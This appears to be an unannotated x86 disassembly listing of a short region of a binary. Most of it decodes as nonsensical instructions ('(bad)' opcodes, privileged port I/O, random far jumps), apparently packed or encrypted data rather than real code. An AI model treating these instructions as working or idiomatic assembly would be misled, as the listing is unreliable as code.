  41f924:	hlt    
  41f925:	push   es
  41f926:	mov    bh,BYTE PTR [esi+0x7258ef90]
  41f92c:	mov    al,0xf1
  41f92e:	ds pop ss
  41f930:	lea    esp,[edx-0x74]
  41f933:	xchg   ebp,eax
  41f934:	cmp    BYTE PTR [edx+0x1e2e8475],0xa2
  41f93b:	xchg   ecx,eax
  41f93c:	adc    BYTE PTR [esi-0x63c3895c],0xca
  41f943:	rcr    esp,cl
  41f945:	dec    edx
  41f946:	cwde   
  41f947:	push   0xac424586
  41f94c:	fs jbe 0x41f948
  41f94f:	mov    ch,0x61
  41f951:	pop    ebp
  41f952:	or     edx,DWORD PTR [esi+0x50]
  41f955:	add    DWORD PTR [ecx-0x21],eax
  41f958:	clc    
  41f959:	in     al,0x59
  41f95b:	mov    edi,fs
  41f95d:	adc    al,0xd3
  41f95f:	fsub   QWORD PTR [ebp-0x1946dfe1]
  41f965:	pop    es
  41f966:	retf   0x2fc4
  41f969:	imul   esp,DWORD PTR [edx+0x576d66c2],0xffffff84
  41f970:	(bad)  
  41f971:	loopne 0x41f991
  41f973:	xor    esp,DWORD PTR [edx-0x1f]
  41f976:	mov    esi,0xcf3031a7
  41f97b:	ret    0xcf3c
  41f97e:	stos   DWORD PTR es:[edi],eax
  41f97f:	push   esi
  41f980:	loop   0x41f9e0
  41f982:	xchg   edi,eax
  41f983:	and    esi,DWORD PTR ss:[ebx+0x165afc7a]
  41f98a:	pusha  
  41f98b:	lock dec ebx
  41f98d:	and    ecx,DWORD PTR [eax+0x4a]
  41f990:	push   es
  41f991:	ins    DWORD PTR es:[edi],dx
  41f992:	into   
  41f993:	jp     0x41f93c
  41f995:	adc    ebp,esi
  41f997:	aaa    
  41f998:	retf   
  41f999:	out    0xed,al
  41f99b:	or     eax,0xb2186be7
  41f9a0:	in     al,dx
  41f9a1:	leave  
  41f9a2:	test   eax,0x9d11a99c
  41f9a7:	mov    bh,0x99
  41f9a9:	popf   
  41f9aa:	std    
  41f9ab:	sub    al,0x19
  41f9ad:	neg    BYTE PTR ds:0x2be79892
  41f9b3:	repz lea ebp,[ecx+edx*8-0x72]
  41f9b8:	fisub  DWORD PTR [edi-0x3fe0439b]
  41f9be:	lock sbb esp,DWORD PTR [ebp+0x1e286228]
  41f9c5:	mov    al,0x1c
  41f9c7:	call   esp
  41f9c9:	loopne 0x41fa0d
  41f9cb:	ins    BYTE PTR es:[edi],dx
  41f9cc:	aas    
  41f9cd:	ret    0x9ae2
  41f9d0:	pusha  
  41f9d1:	enter  0x5df8,0x24
  41f9d5:	push   0x14
  41f9d7:	psubsb mm0,QWORD PTR [esi+0x7d70db4]
  41f9de:	lock jg 0x41f992
  41f9e1:	rcl    DWORD PTR [edx-0x17ef7ad2],0x58
  41f9e8:	rol    DWORD PTR [eax+0x28def65],1
  41f9ee:	pop    ebp
  41f9ef:	aad    0x9
  41f9f1:	add    BYTE PTR [ebp-0x2],ah
  41f9f4:	stc    
  41f9f5:	cmp    DWORD PTR [esi+0x5819ba99],ebp
  41f9fb:	mov    ?,WORD PTR [edi+0x4aebca13]
  41fa01:	call   0x917841b4
  41fa06:	mov    es,WORD PTR [esi+0x70]
  41fa09:	call   0x66b4:0xb4028c9e
  41fa10:	mov    edx,0x9da58e04
  41fa15:	sub    edx,esi
  41fa17:	dec    ebx
  41fa18:	push   es
  41fa19:	jg     0x41fa29
  41fa1b:	sub    ch,BYTE PTR [ebp-0x7b75a8b3]
  41fa21:	loop   0x41fa70
  41fa23:	jne    0x41fa10
  41fa25:	cli    
  41fa26:	xor    eax,0x89018a3c
  41fa2b:	add    eax,0x1a0c7b64
  41fa30:	or     esi,esp
  41fa32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa33:	imul   ebx,DWORD PTR [ecx-0x72475d59],0x77
  41fa3a:	fidiv  WORD PTR [edx-0x78]
  41fa3d:	dec    ebx
  41fa3e:	ins    DWORD PTR es:[edi],dx
  41fa3f:	aad    0xb8
  41fa41:	popw   es
  41fa43:	inc    esi
  41fa44:	and    ebx,DWORD PTR ds:0xd51acef3
  41fa4a:	cs pusha 
  41fa4c:	xchg   edi,eax
  41fa4d:	mov    ecx,0x19d15d67
  41fa52:	pop    ss
  41fa53:	fdivr  DWORD PTR [eax-0x27]
  41fa56:	mov    bl,BYTE PTR [esi]
  41fa58:	(bad)  
  41fa59:	call   0xa452bc59
  41fa5e:	pop    edi
  41fa5f:	call   0xb312:0xe0519e14
  41fa66:	and    al,0x1b
  41fa68:	sar    DWORD PTR [edi-0x2ffb88f6],0x2c
  41fa6f:	jmp    0x1c84:0xd5152393
  41fa76:	xchg   DWORD PTR [esi+0x18b0bd4b],esp
  41fa7c:	xor    al,0xb7
  41fa7e:	add    al,0xe8
  41fa80:	xor    ch,cl
  41fa82:	or     edi,DWORD PTR [ecx+0x26c8dfbc]
  41fa88:	es or  al,0x65
  41fa8b:	sbb    al,BYTE PTR [ecx-0x3b8bc916]
  41fa91:	std    
  41fa92:	mov    esp,0xc2b71c59
  41fa97:	dec    edi
  41fa98:	add    al,0xef
  41fa9a:	imul   esp,DWORD PTR [eax+0x1ce79236],0x15
  41faa1:	inc    ebp
  41faa2:	or     eax,0xdc3d0e47
  41faa7:	es pop eax
  41faa9:	inc    eax
  41faaa:	adc    bl,ah
  41faac:	xchg   ecx,eax
  41faad:	loopne 0x41faf1
  41faaf:	in     eax,dx
  41fab0:	sub    eax,esp
  41fab2:	ret    
  41fab3:	sub    eax,0xac8ca2bb
  41fab8:	jb     0x41fa73
  41faba:	(bad)
  41fabd:	mov    ds:0x87987e91,al
  41fac2:	js     0x41faeb
  41fac4:	nop
  41fac5:	faddp  st(0),st
  41fac7:	xor    DWORD PTR [edi],ebx
  41fac9:	xchg   dl,dl
  41facb:	jns    0x41fa86
  41facd:	(bad)  
  41face:	repnz cdq 
  41fad0:	pop    ebx
  41fad1:	ret    
  41fad2:	push   ecx
  41fad3:	push   ds
  41fad4:	test   al,0x61
  41fad6:	mov    al,0xcd
  41fad8:	(bad)  
  41fad9:	cmp    dl,ch
  41fadb:	push   ebp
  41fadc:	xchg   esi,eax
  41fadd:	sar    BYTE PTR [ebx],cl
  41fadf:	and    ebp,0x23
  41fae2:	cmp    al,0x10
  41fae4:	add    al,BYTE PTR [esi]
  41fae6:	rol    BYTE PTR [ebp+0x38ce347c],1
  41faec:	mov    edi,0xdd06d042
  41faf1:	adc    edx,DWORD PTR ds:0xe4a8e99
  41faf7:	fild   WORD PTR [esi-0x2b]
  41fafa:	test   BYTE PTR [edx-0x10e66b24],al
  41fb00:	popf   
  41fb01:	adc    BYTE PTR [esp+ecx*1-0x1f5b20e5],cl
  41fb08:	xchg   esi,eax
  41fb09:	xchg   BYTE PTR [edi-0x27],cl
  41fb0c:	jg     0x41faf6
  41fb0e:	jmp    0x549bf86f
  41fb13:	xchg   esp,eax
  41fb14:	jno    0x41fb7a
  41fb16:	das    
  41fb17:	rcr    DWORD PTR [ebp+0x2a8f651a],0xd8
  41fb1e:	push   0xddaebc5f
  41fb23:	call   0xa0361bfd
  41fb28:	push   esi
  41fb29:	retf   0x87dc
  41fb2c:	cwde   
  41fb2d:	xor    BYTE PTR [ebp+0x29],ch
  41fb30:	out    dx,eax
  41fb31:	adc    ah,BYTE PTR [ebx-0x60]
  41fb34:	bound  esi,QWORD PTR [esi+0x22]
  41fb37:	cdq    
  41fb38:	add    DWORD PTR [eax],0x5
  41fb3b:	pushf  
  41fb3c:	dec    eax
  41fb3d:	inc    esp
  41fb3e:	in     al,0x17
  41fb40:	pop    esi
  41fb41:	or     BYTE PTR [eax],ah
  41fb43:	div    BYTE PTR [ebx]
  41fb45:	jle    0x41fb8e
  41fb47:	push   eax
  41fb48:	push   esi
  41fb49:	je     0x41fb10
  41fb4b:	cmp    edi,ecx
  41fb4d:	cli    
  41fb4e:	inc    esp
  41fb4f:	jp     0x41fb0e
  41fb51:	ror    BYTE PTR [ebx-0x1a],1
  41fb54:	loopne 0x41fad8
  41fb56:	push   edi
  41fb57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb58:	mov    edx,0x3d4ad7ed
  41fb5d:	lods   al,BYTE PTR ds:[esi]
  41fb5e:	push   ss
  41fb5f:	aad    0x84
  41fb61:	push   ecx
  41fb62:	or     cl,BYTE PTR [ebx-0x45]
  41fb65:	xchg   edx,eax
  41fb66:	fist   DWORD PTR [ebp+0x2e746df7]
  41fb6c:	daa    
  41fb6d:	or     al,0x7e
  41fb6f:	je     0x41fb01
  41fb71:	cmp    BYTE PTR [eax+0x4a7e6d1d],dl
  41fb77:	mov    al,ds:0x92dad707
  41fb7c:	add    esp,DWORD PTR [esp+edx*2+0x5f52ecc5]
  41fb83:	shr    BYTE PTR [edi+0x5f],0x2d
  41fb87:	lods   eax,DWORD PTR ds:[esi]
  41fb88:	out    dx,al
  41fb89:	int3   
  41fb8a:	adc    dl,BYTE PTR [edx+0x2efd5a1d]
  41fb90:	cs jae 0x41fc11
  41fb93:	adc    eax,DWORD PTR ds:0xe5e3494a
  41fb99:	out    dx,eax
  41fb9a:	scas   al,BYTE PTR es:[edi]
  41fb9b:	add    al,0xed
  41fb9d:	mov    bl,0xb3
  41fb9f:	fmul   st,st(1)
  41fba1:	das    
  41fba2:	sbb    al,0x35
  41fba4:	or     eax,0xcbd583b8
  41fba9:	mov    DWORD PTR [esi+0x532678f],edi
  41fbaf:	push   es
  41fbb0:	push   ds
  41fbb1:	retf   
  41fbb2:	jl     0x41fc1b
  41fbb4:	sar    DWORD PTR ss:[edx+eiz*1+0x4274bd2f],cl
  41fbbc:	adc    BYTE PTR [eax+0x734d2f1c],ah
  41fbc2:	sub    eax,0x5978a23b
  41fbc7:	iret   
  41fbc8:	adc    bh,ah
  41fbca:	mov    ebp,0xdd1858b9
  41fbcf:	sbb    BYTE PTR [edx],dl
  41fbd1:	fs ds mov esi,0x774fe833
  41fbd8:	sub    bl,BYTE PTR [eax-0x397eb231]
  41fbde:	xchg   esi,eax
  41fbdf:	ja     0x41fc50
  41fbe1:	dec    esi
  41fbe2:	mov    dl,0xc7
  41fbe4:	pop    eax
  41fbe5:	inc    esp
  41fbe6:	mov    edi,0x8f08782a
  41fbeb:	lods   eax,DWORD PTR ds:[esi]
  41fbec:	stos   DWORD PTR es:[edi],eax
  41fbed:	dec    ecx
  41fbee:	pop    ss
  41fbef:	test   BYTE PTR [edx-0xbc6d9a3],bh
  41fbf5:	sbb    ebp,eax
  41fbf7:	das    
  41fbf8:	mul    BYTE PTR [ecx]
  41fbfa:	or     DWORD PTR [eax],esp
  41fbfc:	jns    0x41fbf7
  41fbfe:	push   ds
  41fbff:	mov    edi,0x83dad155
  41fc04:	fisub  DWORD PTR [ebx+0x25898873]
  41fc0a:	enter  0x7043,0xb4
  41fc0e:	ja     0x41fb99
  41fc10:	test   BYTE PTR [ecx+0x51a6efe1],bh
  41fc16:	xor    DWORD PTR [eax+0x311f2d67],esp
  41fc1c:	(bad)  
  41fc1d:	add    al,0x0
  41fc1f:	sub    DWORD PTR [ebx-0x6c],esp
  41fc22:	inc    edx
  41fc23:	jecxz  0x41fbde
  41fc25:	jp     0x41fc77
  41fc27:	fild   WORD PTR [eax-0x7937f5a8]
  41fc2d:	fwait
  41fc2e:	out    0x3f,al
  41fc30:	std    
  41fc31:	jmp    0x41fc9f
  41fc33:	test   eax,0x96fd319
  41fc38:	in     al,0x25
  41fc3a:	cli    
  41fc3b:	sbb    al,0x39
  41fc3d:	inc    ebp
  41fc3e:	mov    esi,0x5c8f20b9
  41fc43:	sbb    eax,0x2c165924
  41fc48:	jo     0x41fc3e
  41fc4a:	push   0x77
  41fc4c:	xor    eax,0x70260f5
  41fc51:	cmp    bl,BYTE PTR [esi+eax*2]
  41fc54:	fisttp WORD PTR [ecx-0x46d939f9]
  41fc5a:	mov    ch,0x6f
  41fc5c:	fld    DWORD PTR [edx]
  41fc5e:	(bad)  
  41fc60:	mov    al,0x56
  41fc62:	repnz xor bh,BYTE PTR [esi+edx*4]
  41fc66:	inc    esi
  41fc67:	mov    dh,0xe9
  41fc69:	jnp    0x41fc68
  41fc6b:	retf   0xc36d
  41fc6e:	dec    eax
  41fc6f:	lds    esp,FWORD PTR [ebx-0x7789dd10]
  41fc75:	fucomip st,st(3)
  41fc77:	add    esi,DWORD PTR [ebp+0x74]
  41fc7a:	shr    DWORD PTR [edi-0x6ed66466],cl
  41fc80:	cli    
  41fc81:	sbb    al,0x14
  41fc83:	les    ecx,FWORD PTR [ecx+eiz*8+0x49de567b]
  41fc8a:	std    
  41fc8b:	cmp    al,0x3b
  41fc8d:	pushf  
  41fc8e:	or     ah,BYTE PTR [ebp-0x67]
  41fc91:	in     al,dx
  41fc92:	adc    ah,BYTE PTR [edi+0x1b]
  41fc95:	pop    ss
  41fc96:	push   edi
  41fc97:	(bad)  
  41fc98:	retf   
  41fc99:	lea    edx,[edx]
  41fc9b:	popa   
  41fc9c:	aam    0xc6
  41fc9e:	xchg   ebx,eax
  41fc9f:	push   0xffffff90
  41fca1:	hlt    
  41fca2:	aas    
  41fca3:	fld    TBYTE PTR [eax-0x42]
  41fca6:	xchg   esp,eax
  41fca7:	ins    DWORD PTR es:[edi],dx
  41fca8:	pusha  
  41fca9:	cmp    BYTE PTR [eax+0x4d065400],al
  41fcaf:	sbb    DWORD PTR [ebx+0x7171792c],ebx
  41fcb5:	dec    esp
  41fcb6:	or     DWORD PTR [ecx+0x39],edx
  41fcb9:	js     0x41fcdd
  41fcbb:	cmp    BYTE PTR [esp+ecx*4],dh
  41fcbe:	cwde   
  41fcbf:	inc    ebp
  41fcc0:	arpl   WORD PTR [esi+0x594723bc],ax
  41fcc6:	mul    DWORD PTR [edi-0x1de9f0f5]
  41fccc:	out    dx,al
  41fccd:	(bad)  
  41fcce:	loop   0x41fc55
  41fcd0:	and    DWORD PTR [esi],ebp
  41fcd2:	dec    ebp
  41fcd3:	sti    
  41fcd4:	lods   eax,DWORD PTR ds:[esi]
  41fcd5:	ds push eax
  41fcd7:	pop    es
  41fcd8:	pop    ebp
  41fcd9:	and    ebp,DWORD PTR [esi]
  41fcdb:	imul   esp,DWORD PTR [edx*8-0x1099c75a],0x760889b9
  41fce6:	call   DWORD PTR [ebp-0x25]
  41fce9:	ss aas 
  41fceb:	cwde   
  41fcec:	int    0x1f
  41fcee:	add    edi,DWORD PTR [esi-0x5873fc8d]
  41fcf4:	mov    ds:0x3eca6abf,eax
  41fcf9:	(bad)  
  41fcfa:	jl     0x41fcf2
  41fcfc:	jne    0x41fd7b
  41fcfe:	int    0x90
  41fd00:	popf   
  41fd01:	cs ja  0x41fd21
  41fd04:	xchg   esp,eax
  41fd05:	jge    0x41fd3f
  41fd07:	sub    DWORD PTR [eax+0x70],edx
  41fd0a:	pop    es
  41fd0b:	arpl   WORD PTR [edx+0x65],bp
  41fd0e:	mov    DWORD PTR [ebp-0x740440b7],ecx
  41fd14:	dec    esi
  41fd15:	mov    DWORD PTR ds:0x52d0f2ac,0x5e7e117f
  41fd1f:	iret   
  41fd20:	std    
  41fd21:	pop    edi
  41fd22:	outs   dx,DWORD PTR ds:[esi]
  41fd23:	and    al,BYTE PTR [ebx-0x7da3fec8]
  41fd29:	sahf   
  41fd2a:	inc    esi
  41fd2b:	mov    ch,0x12
  41fd2d:	lods   eax,DWORD PTR ds:[esi]
  41fd2e:	fwait
  41fd2f:	cmp    al,0xb5
  41fd31:	out    0xc1,al
  41fd33:	ret    0x97b
  41fd36:	dec    edx
  41fd37:	mov    BYTE PTR [ecx+0x51],bl
  41fd3a:	dec    esi
  41fd3b:	pop    ebp
  41fd3c:	xchg   edi,eax
  41fd3d:	cld    
  41fd3e:	jnp    0x41fd2a
  41fd40:	mov    cl,0xe9
  41fd42:	adc    DWORD PTR [ebp+0x5ec51ef4],eax
  41fd48:	inc    esp
  41fd49:	aas    
  41fd4a:	mov    ebx,0x5ec158f9
  41fd4f:	mov    BYTE PTR [edi+0x6e],dl
  41fd52:	sub    ebp,edi
  41fd54:	loop   0x41fd81
  41fd56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd57:	push   ds
  41fd58:	xor    dh,BYTE PTR [ecx-0x1e527b02]
  41fd5e:	loop   0x41fd23
  41fd60:	ret    
  41fd61:	mov    cl,0x70
  41fd63:	push   ds
  41fd64:	test   BYTE PTR [ebp+0x5cdabfb],bl
  41fd6a:	mov    ah,0xbb
  41fd6c:	lock jns 0x41fdcc
  41fd6f:	addr16 or eax,0xf2647bf5
  41fd75:	call   0xedca:0xf066db65
  41fd7c:	les    ebp,FWORD PTR [ecx]
  41fd7e:	inc    si
  41fd80:	mov    ecx,0x4493258d
  41fd85:	pop    es
  41fd86:	cmp    BYTE PTR ds:0x52014b56,ch
  41fd8c:	imul   esp,DWORD PTR [esi-0x57],0x87dc55e6
  41fd93:	call   0xc041ae3e
  41fd98:	and    eax,0xf674a8f5
  41fd9d:	in     eax,0x95
  41fd9f:	cld    
  41fda0:	adc    al,0x88
  41fda2:	cmp    al,0xc3
  41fda4:	inc    edx
  41fda5:	retf   
  41fda6:	imul   edi,DWORD PTR [ebx],0x52
  41fda9:	cmc    
  41fdaa:	pop    ss
  41fdab:	aam    0x21
  41fdad:	lods   eax,DWORD PTR ds:[esi]
  41fdae:	cwde   
  41fdaf:	pop    ds
  41fdb0:	add    dl,BYTE PTR [ecx+edi*1-0x38]
  41fdb4:	shr    cl,0x52
  41fdb7:	dec    edx
  41fdb8:	(bad)  
  41fdb9:	mov    eax,0x5e771557
  41fdbe:	lahf   
  41fdbf:	or     al,0xa5
  41fdc1:	mul    BYTE PTR [esi]
  41fdc3:	lds    esp,FWORD PTR [ecx+ebx*8]
  41fdc6:	jnp    0x41fda9
  41fdc8:	loop   0x41fe46
  41fdca:	pop    esi
  41fdcb:	into   
  41fdcc:	xlat   BYTE PTR ds:[ebx]
  41fdcd:	mov    ds:0x12bd59a4,eax
  41fdd2:	pop    esi
  41fdd3:	aaa    
  41fdd4:	leave  
  41fdd5:	cmp    DWORD PTR [ebp-0x14],esp
  41fdd8:	mov    ebp,0x25e77a9b
  41fddd:	jbe    0x41fe30
  41fddf:	gs mov bh,0x16
  41fde2:	lods   eax,DWORD PTR ds:[esi]
  41fde3:	hlt    
  41fde4:	fs imul eax
  41fde7:	or     BYTE PTR [ebx],bl
  41fde9:	xor    ebx,ebp
  41fdeb:	mov    bh,0x79
  41fded:	and    al,0x87
  41fdef:	scas   al,BYTE PTR es:[edi]
  41fdf0:	inc    cl
  41fdf2:	loopne 0x41fe70
  41fdf4:	fsub   DWORD PTR [esi-0x6240058]
  41fdfa:	add    bh,al
  41fdfc:	loopne 0x41fda3
  41fdfe:	int3   
  41fdff:	int3   
  41fe00:	inc    edi
  41fe01:	push   ebp
  41fe02:	inc    ebx
  41fe03:	test   eax,0xdaf317e0
  41fe08:	xchg   BYTE PTR [edx+ebp*8],bh
  41fe0b:	aas    
  41fe0c:	xchg   ecx,eax
  41fe0d:	test   eax,0xa17803f7
  41fe12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe13:	xchg   esi,eax
  41fe14:	retf   0xb535
  41fe17:	mov    esp,0xa3476159
  41fe1c:	mov    ebx,0x86a5096
  41fe21:	rcr    BYTE PTR [ecx-0x1819bb16],1
  41fe27:	jg     0x41fe10
  41fe29:	adc    BYTE PTR [ebp+eiz*1+0x4f72386a],al
  41fe30:	sub    eax,0x83f47c20
  41fe35:	das    
  41fe36:	fdivr  DWORD PTR [ebx]
  41fe38:	fiadd  WORD PTR [edx]
  41fe3a:	retf   
  41fe3b:	mov    ah,0xbe
  41fe3d:	fimul  DWORD PTR [ebx]
  41fe3f:	jae    0x41fea5
  41fe41:	test   cl,dh
  41fe43:	into   
  41fe44:	ror    DWORD PTR [esi-0x58],0xc9
  41fe48:	xor    al,0x36
  41fe4a:	push   ebx
  41fe4b:	or     DWORD PTR [edx-0x1],ecx
  41fe4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe4f:	mov    ch,0xea
  41fe51:	dec    esi
  41fe52:	aas    
  41fe53:	lahf   
  41fe54:	mov    edx,0xef66198a
  41fe59:	cmp    ebx,edx
  41fe5b:	int    0xb7
  41fe5d:	or     al,0xd9
  41fe5f:	imul   ebp,DWORD PTR [edx],0xffffffe4
  41fe62:	dec    ebp
  41fe63:	xor    al,0x58
  41fe65:	fstp   DWORD PTR [eax-0x46c01051]
  41fe6b:	sar    DWORD PTR [esi],1
  41fe6d:	std    
  41fe6e:	add    cl,BYTE PTR [esi]
  41fe70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe71:	call   0xcd17:0xad33661f
  41fe78:	mov    edx,0x94fade77
  41fe7d:	daa    
  41fe7e:	lods   eax,DWORD PTR ds:[esi]
  41fe7f:	retf   0x1d1b
  41fe82:	addr16 xchg ecx,eax
  41fe84:	mov    edx,eax
  41fe86:	inc    esp
  41fe87:	in     al,dx
  41fe88:	pop    ecx
  41fe89:	or     BYTE PTR [edi-0x427db037],dh
  41fe8f:	sbb    eax,0xdc4503df
  41fe94:	jmp    0x6027:0xe5a18e61
  41fe9b:	das    
  41fe9c:	cli    
  41fe9d:	(bad)  
  41fe9e:	lea    edx,[ebx-0x16502b69]
  41fea4:	xor    edi,edx
  41fea6:	daa    
  41fea7:	mov    dh,0xdd
  41fea9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41feaa:	xchg   edi,eax
  41feab:	les    edi,FWORD PTR [edx+0x4]
  41feae:	mov    edi,0x9fc07001
  41feb3:	fld    TBYTE PTR [eax]
  41feb5:	cmp    al,0xa8
  41feb7:	retf   0x5344
  41feba:	pop    eax
  41febb:	fwait
  41febc:	sub    BYTE PTR [eax],dl
  41febe:	(bad)  
  41febf:	imul   esi,DWORD PTR [bx+si+0x269b],0xffffffd4
  41fec5:	popf   
  41fec6:	dec    ebp
  41fec7:	fld    TBYTE PTR [ecx]
  41fec9:	daa    
  41feca:	lods   eax,DWORD PTR ds:[esi]
  41fecb:	popf   
  41fecc:	xor    eax,0x31feb1b4
  41fed1:	in     al,0x48
  41fed3:	cmp    DWORD PTR [edi+0x16b3b522],edi
  41fed9:	dec    ebx
  41feda:	out    dx,al
  41fedb:	retf   
  41fedc:	or     DWORD PTR [edx+0x77],edi
  41fedf:	pop    ecx
  41fee0:	bnd jnp 0x41ff5a
  41fee3:	dec    eax
  41fee4:	jns    0x41ff44
  41fee6:	or     ecx,DWORD PTR [edx-0x3aa48daa]
  41feec:	aad    0x7a
  41feee:	mov    DWORD PTR [edi],edi
  41fef0:	inc    ecx
  41fef1:	and    bl,BYTE PTR [edx+edx*8-0x1127cd0c]
  41fef8:	mov    al,0xe2
  41fefa:	loope  0x41fed1
  41fefc:	test   cl,bh
  41fefe:	dec    ecx
  41feff:	or     dh,dh
  41ff01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff02:	sbb    ah,0x7f
  41ff05:	jae    0x41ff7c
  41ff07:	jp     0x41ff86
  41ff09:	pop    esi
  41ff0a:	pop    ss
  41ff0b:	push   es
  41ff0c:	xchg   DWORD PTR [ebp-0x358fc55d],edx
  41ff12:	mov    eax,0x5103b08
  41ff17:	out    dx,al
  41ff18:	pusha  
  41ff19:	ret    0x566f
  41ff1c:	jp     0x41feca
  41ff1e:	sub    bl,BYTE PTR [edi]
  41ff20:	(bad)  
  41ff22:	sub    DWORD PTR [eax+0x61],edi
  41ff25:	ret    
  41ff26:	cmc    
  41ff27:	or     ch,BYTE PTR [esi-0x60]
  41ff2a:	fst    DWORD PTR [ebx+eiz*2+0x5c1bf26d]
  41ff31:	or     ebx,edi
  41ff33:	ret    
  41ff34:	push   0xa3034dd2
  41ff39:	in     eax,dx
  41ff3a:	enter  0xba68,0x6b
  41ff3e:	add    edi,DWORD PTR [edx+0x2b]
  41ff41:	sub    eax,0xd29e8ef3
  41ff46:	or     edx,esi
  41ff48:	xchg   BYTE PTR [edi-0x1913840d],al
  41ff4e:	lea    ebx,[ebp+0x6a93b4db]
  41ff54:	mov    ebx,DWORD PTR [ecx-0x4875eb1b]
  41ff5a:	stc    
  41ff5b:	pop    esi
  41ff5c:	call   0x52d6:0x7345c3ae
  41ff63:	dec    edx
  41ff64:	loop   0x41ff11
  41ff66:	push   edx
  41ff67:	popf   
  41ff68:	pop    es
  41ff69:	mov    ecx,0xf0e4ef61
  41ff6e:	shr    BYTE PTR [eax],cl
  41ff70:	pop    esp
  41ff71:	xor    BYTE PTR [ebp-0x18e0c33e],dh
  41ff77:	call   0xe186:0x35ef407f
  41ff7e:	xor    al,ah
  41ff80:	mov    al,ds:0xed347a06
  41ff85:	jmp    0x84df:0xf682a8e5
  41ff8c:	ret    0x9133
  41ff8f:	aaa    
  41ff90:	jo     0x41ff7c
  41ff92:	std    
  41ff93:	sar    dh,0xf8
  41ff96:	aad    0x3b
  41ff98:	or     DWORD PTR [ecx+0x4fa93925],edx
  41ff9e:	adc    eax,DWORD PTR [ebx-0x13]
  41ffa1:	lea    si,[ecx]
  41ffa4:	frstor [edi]
  41ffa6:	sbb    ch,BYTE PTR [edx]
  41ffa8:	inc    edi
  41ffa9:	out    dx,eax
  41ffaa:	or     eax,0x52cbffa7
  41ffaf:	sub    bl,bh
  41ffb1:	aaa    
  41ffb2:	jge    0x420006
  41ffb4:	rcr    DWORD PTR [ebp-0x73],1
  41ffb7:	dec    eax
  41ffb8:	test   eax,0xa9175c7c
  41ffbd:	dec    ebx
  41ffbe:	jb     0x41ffa2
  41ffc0:	lahf   
  41ffc1:	test   DWORD PTR [edx],0x3a0e3ce6
  41ffc7:	mov    ah,0x5
  41ffc9:	dec    edi
  41ffca:	sbb    al,BYTE PTR [edx+0x7ac8ded6]
  41ffd0:	shr    DWORD PTR [ebp-0x7d389e7b],0x57
  41ffd7:	jp     0x420013
  41ffd9:	xchg   ebx,eax
  41ffda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ffdb:	mov    edx,0xb7f5f93b
  41ffe0:	scas   al,BYTE PTR es:[edi]
  41ffe1:	ss js  0x41ffbf
  41ffe4:	pop    ds
  41ffe5:	aad    0x77
  41ffe7:	push   ebp
  41ffe8:	mov    ch,0x62
  41ffea:	cs aad 0xc9
  41ffed:	out    0xc3,eax
  41ffef:	loope  0x41ff90
  41fff1:	adc    al,0x18
  41fff3:	sub    edi,DWORD PTR [ebp+0x23eb5a6d]
  41fff9:	iret   
  41fffa:	inc    edx
  41fffb:	pop    ds
  41fffc:	sub    esp,DWORD PTR [esi]
  41fffe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffff:	jo     0x42001d
  420001:	mov    eax,0x19748c88
  420006:	push   edi
  420007:	out    0xaf,eax
  420009:	js     0x420003
  42000b:	and    cl,BYTE PTR [esi-0x6c]
  42000e:	in     al,dx
  42000f:	fldcw  WORD PTR [edi+ebx*2-0xf]
  420013:	jg     0x41ffe2
  420015:	push   esp
  420016:	andnps xmm1,XMMWORD PTR [edi+ebx*4]
  42001a:	pop    ecx
  42001b:	cmp    DWORD PTR [edi-0x7525910],esi
  420021:	add    eax,0x2a401fdc
  420026:	jmp    0x7405:0x474cd495
  42002d:	and    DWORD PTR [esi+0x18d0ea29],0x76
  420034:	enter  0x41b,0x15
  420038:	js     0x42002c
  42003a:	in     al,dx
  42003b:	ss lock jl 0x41ffbf
  42003f:	rcl    DWORD PTR [eax],0xbc
  420042:	xor    BYTE PTR ss:[esi+ecx*8-0x5d1acedc],bh
  42004a:	repz dec ebp
  42004c:	or     al,0xec
  42004e:	push   ss
  42004f:	enter  0xda42,0x4a
  420053:	add    BYTE PTR [edi+0x14],al
  420056:	mov    esp,ecx
  420058:	iret   
  420059:	loopne 0x420012
  42005b:	add    ebx,DWORD PTR [esi+eax*2-0x6aa8af]
  420062:	add    cl,al
  420064:	adc    al,0x95
  420066:	mov    ah,0xca
  420068:	repnz sbb cl,BYTE PTR [eax]
  42006b:	xchg   edi,eax
  42006c:	jecxz  0x420045
  42006e:	sar    DWORD PTR [esi-0x3e7e5c71],0x53
  420075:	(bad)  
  420076:	xor    ah,dh
  420078:	sbb    al,0xc6
  42007a:	dec    edi
  42007b:	das    
  42007c:	mov    edx,0xab0daf10
  420081:	add    DWORD PTR [esi],edi
  420083:	xlat   BYTE PTR ds:[ebx]
  420084:	inc    ebp
  420085:	retf   0xa8a
  420088:	mov    BYTE PTR [edx-0x319e974c],dh
  42008e:	retf   0xbd0b
  420091:	mov    eax,ds:0x7c502ca3
  420096:	repz leave 
  420098:	out    0x85,eax
  42009a:	xchg   esp,eax
  42009b:	or     BYTE PTR [eax],ah
  42009d:	shr    edi,1
  42009f:	int3   
  4200a0:	xlat   BYTE PTR ds:[ebx]
  4200a1:	fmul   QWORD PTR [esp+eax*1]
  4200a4:	out    0x12,al
  4200a6:	test   BYTE PTR ds:0x812d4c15,bh
  4200ac:	xchg   ebx,eax
  4200ad:	(bad)  
  4200ae:	cs jle 0x4200fa
  4200b1:	pushf  
  4200b2:	stos   BYTE PTR es:[edi],al
  4200b3:	jp     0x42012d
  4200b5:	adc    al,BYTE PTR [ecx+eiz*4]
  4200b8:	dec    ebp
  4200b9:	mov    cl,0x16
  4200bb:	ds dec ebp
  4200bd:	lds    ebp,FWORD PTR ds:0x11c06fe6
  4200c3:	push   ecx
  4200c4:	loope  0x420108
  4200c6:	add    ah,BYTE PTR [eax-0x1]
  4200c9:	sbb    BYTE PTR [esp+ebx*4+0x6c9d4ff9],ah
  4200d0:	shl    eax,cl
  4200d2:	jns    0x42014a
  4200d4:	sbb    DWORD PTR [eax],ecx
  4200d6:	jne    0x420104
